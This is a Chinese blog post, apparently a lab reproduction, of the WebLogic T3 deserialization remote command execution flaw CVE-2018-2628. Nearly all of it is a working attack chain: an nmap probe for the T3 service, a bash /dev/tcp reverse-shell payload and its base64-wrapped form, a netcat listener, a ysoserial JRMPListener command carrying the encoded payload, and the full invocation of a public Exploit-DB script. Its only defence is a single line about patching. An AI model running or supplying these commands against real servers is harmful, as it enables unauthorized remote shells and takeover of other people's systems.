# Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628 - 学安全的小白 - 博客园

> 原文：[`www.cnblogs.com/pursue-security/p/17029174.html`](https://www.cnblogs.com/pursue-security/p/17029174.html)

漏洞编号 CVE-2018-2628 漏洞描述[Weblogic](https://so.csdn.net/so/search?q=Weblogic&spm=1001.2101.3001.7020) Server WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过 T3 协议触发，可导致未授权的用户在远程服务器执行任意命令。影响版本 Weblogic 10.3.6.0Weblogic 12.1.3.0Weblogic 12.2.1.2Weblogic 12.2.1.3 漏洞验证 1、使用 goby 或 nmap 扫出来目标存在 weblogic 后，再使用以下 nmap 命令探测目标是否开启了 T3 服务。nmap -T4 -sV -O -P 7001 --script weblogic-t3-info 192.168.116.133![0](img/ba133b5ebcbf3454205797d22b7db5e3.png)从扫描结果可以看出目标主机已开启 T3 服务 2、使用响应的 poc 脚本进行检测![](img/eb8f7feb2ba569e7f41a6c429e576efd.png)由图所示目标存在漏洞。漏洞复现 1、该命令执行漏洞无回显，因此只能对目标执行代码而无法返回执行结果，所以，这里直接进行反弹 shell。反弹 shell payload：bash -i >& /dev/tcp/192.168.116.140/4444 0>&1 由于 Runtime.getRuntime().exec()中不能使用管道符等 bash 需要的方法，所以使用 base64 的反弹 shell 的形式，具体如下：bash -c {echo,上面反弹 shell 的 base64 编码}|{base64,-d}|{bash,-i}2、在攻击机上使用 nc 监听端口 nc -lvvp 44443、在攻击机或 vps 上开启 JRMP Server 端口监听，端口随意，这里设置为 30080.java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 30080 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNi4xNDAvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'![](img/4c2ae4479eb2898507a362a8c2b2d7af.png)出现 Opening JRMP listener on 30080 即表明 jrmp server 监听成功。4、在攻击机上执行 payload 进行攻击。exp 下载地址：[`www.exploit-db.com/exploits/44553`](https://www.exploit-db.com/exploits/44553)copy 代码，保存为 exploit.py 即可。python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]这里的 victim ip/port 为靶机的 ip 和端口，path to ysoserial 为 ysoserial.jar 文件的路径，因为这个 exp 会调用这个 jar，JRMPListener ip/port 为 jrmp server 服务器的 ip 和监听的端口，这里端口为 30080。JRMPClient 有两个选项，为：JRMPClient 或 JRMPClient2，这里使用 JRMPClient。最终 payload：python CVE-2018-2628exploit.py 192.168.116.133 7001 /root/weblogic/ysoserial-all.jar 192.168 .116.140 30080 JRMPClient 反弹 shell 成功：![](img/e9aac5e9ae897bb317229641b612592c.png)漏洞防御升级 weblogic 版本或打补丁